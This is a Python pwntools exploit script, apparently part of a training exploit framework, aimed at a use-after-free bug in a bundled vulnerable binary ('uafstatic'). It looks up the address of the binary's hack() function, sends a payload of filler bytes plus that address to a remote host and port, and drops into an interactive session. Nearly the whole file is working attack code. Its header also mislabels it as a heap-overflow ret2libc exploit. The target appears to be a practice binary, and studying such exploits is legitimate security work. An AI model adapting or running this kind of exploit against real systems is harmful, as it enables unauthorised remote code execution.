#! /usr/bin/python
#coding:utf-8
'''Heap_Overflow - Ret2libc (ALSR - on)'''
import os
import sys

sys.path.append(os.path.abspath("../.."))
from modules.script_tools import *
from modules import exploit
from pwn import *

class Exploit(exploit.VRL_Exploit):
    
    def __init__(self):
        self.name = 'uaf'
        self.payload_info = 'DEP ON ASLR on'
        self.info = '''Exploit Name : UAF
                       Exploit abstract :use after free
                       Author : guoyingjie
                       Support change payload : false'''
        # read options from share
        self.options = {'dIP' :  get_share('dIP'),
                   'port' : get_share('port'),
                   'wait' : get_share('wait')}
        self.property = {
            'sysbinsh':0x0 #hack() fuanction address in vulnerability programm
            }
        self.vulnerability= 'vulnerabilities/uaf/uafstatic'
    def run(self):
        ip, port = self.options['dIP'], int(self.options['port'])
        p = remote(ip, port)

        #debug
        if eval(self.options['wait']):
               a= raw_input("You can attach now.\nPress Any Key to begin...")

        # get hack() fuanction address in vulnerability programm
        libc = ELF('../../vulnerabilities/uaf/uafstatic')
        self.property['sysbinsh'] = libc.symbols['hack'] 

        print hex(self.property['sysbinsh'])

        payload = '1' * 8 + p64(self.property['sysbinsh'])
        p.sendline(payload)
        #print p.recv(8)
       
        
        
        p.interactive()





if __name__=='__main__':
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()

